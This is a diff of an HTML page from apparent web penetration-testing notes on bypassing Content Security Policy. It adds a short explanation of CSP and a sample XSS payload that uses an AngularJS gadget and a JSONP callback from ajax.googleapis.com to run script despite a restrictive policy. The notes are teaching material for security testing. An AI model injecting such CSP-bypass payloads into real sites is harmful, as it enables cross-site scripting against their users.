@@ -29,11 +29,27 @@
 
 <p class="titulos"><mark>[CSP HEADER BYPASS]</mark></p>
 <div>
-<pre>
 <div class="column" style="display: inline-block; text-align: left; background-color:gray;">
 <button onclick="document.location='/offensive/web_penetration_testing/client_side_attacks.html'" class="round" style="float: left;">&lt;&lt;</button><br><br>
+
+CSP: content security policy | its a way to restrict what is allowed in the application
+	
+Notes:
+	1. 'self' means it allows from same domain.
+	2. CSP policy is defined in the response header, this is how browser knows the CSP policy is in place
+	3. use the dev tools when testing and inspect using the console tab to see if any 'alert' notification pop-up. 
+	
+	
 <details>
 <summary>bypass via ajax.googleapis.com</summary>
+
+sample: 
+	content-security-policy: script-src 'self' ajax.googleapis.com
+
+<code>
+<div ng-app ng-csp id=p ng-click=$event.view.alert("XSS")><script src="//ajax.googleapis.com/ajax/libs/angularjs/1.6.6/angular.min.js"></script>
+<script async src=//ajax.googleapis.com/jsapi?callback=p.click></script>
+</code>
 	
 </details>	
 <details>
@@ -48,8 +64,8 @@
 <summary>bypass via AngularJS</summary>
 	
 </details>
-<button onclick="document.location='/offensive/web_penetration_testing/client_side_attacks.html'">GO BACK</button>
 </div>
+<button onclick="document.location='/offensive/web_penetration_testing/client_side_attacks.html'">GO BACK</button>
 <p class="titulos">©® - 2023/2024.</p>
 </center>
 </body>
